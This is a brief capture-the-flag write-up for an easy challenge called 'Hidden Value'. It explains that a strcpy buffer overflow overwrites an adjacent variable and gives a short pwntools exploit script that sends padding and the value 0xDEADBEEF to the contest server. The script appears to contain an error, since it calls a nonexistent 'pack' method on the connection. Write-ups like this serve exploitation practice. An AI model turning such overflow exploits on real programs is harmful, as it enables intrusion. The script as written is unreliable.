Hidden Value
50
Easy
There's a hidden value in this program, can you find it?

## Solution:

1. Buffer overflow in strcpy.
2. Overwrite the next variable.

```python
from pwn import *

io = remote('chal.tuctf.com', 30012)

io.send(b'a'*44)
io.pack(0xDEADBEEF)

io.interactive()
```
